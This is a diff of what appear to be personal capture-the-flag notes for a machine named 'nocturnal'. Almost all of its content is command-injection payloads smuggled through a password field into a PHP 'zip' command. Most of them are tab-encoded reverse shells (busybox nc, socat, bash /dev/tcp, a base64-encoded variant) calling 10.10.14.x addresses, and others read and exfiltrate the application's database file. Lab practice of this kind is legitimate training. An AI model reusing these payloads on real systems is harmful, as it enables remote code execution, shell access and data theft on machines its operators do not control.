@@ -98,9 +98,6 @@ $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  
 
 1234"%09"backups/cool.zip"%09../nocturnal_database%09>%09/tmp/cool_backup#
 
-
-
-
 1234"shellCMDHERE
 
 1234"%09backups/backup_2025_05_11.zip%09..%09#
@@ -109,15 +106,9 @@ $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  
 
 1234"%09cat%09/tmp/f%09
 
-
 1234"%09busybox%09nc%09-l%09-p%094444%09-e%09/bin/sh
 
-
-
-
 1234"socat%09TCP:10.10.14.25:443%09EXEC:sh
-
-
 
 1234"%09/bin/bash%09-i%09>&%09/dev/tcp/10.10.14.23/4444%090>&1
 
@@ -126,12 +117,6 @@ $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  
 
 # this but I get that my ip is refusing the connection???
 1234"%09busybox%09nc%0910.10.14.25%094444%09-e%09/bin/bash
-
-
-
-
-
-
 
 
        On ‘server’ side:
@@ -164,13 +149,9 @@ function cleanEntry($entry) {
 
 
 
-
-
-
-# this worked !!!!!!!!!!
+# This worked !!!!!!!!!!
 
 1234"zip%09-r%09backups/cool.zip%09../nocturnal_database/%09
-
 
 
 port 8080 on the machine is running ispconfig web portal
@@ -240,9 +221,6 @@ $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  
 bash zip -x ./backups/* -r -P ()
 
 
-
-
-
 ```powershell
 original_cmd_by_server; ls
 original_cmd_by_server && ls
@@ -293,9 +271,7 @@ base64 -D <<< YmFzaCAtYyAic2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQzIDA+JjEiCg
 
 
 
-
 ../nocturnal_database/nocturnal_database.db
-
 
 
 
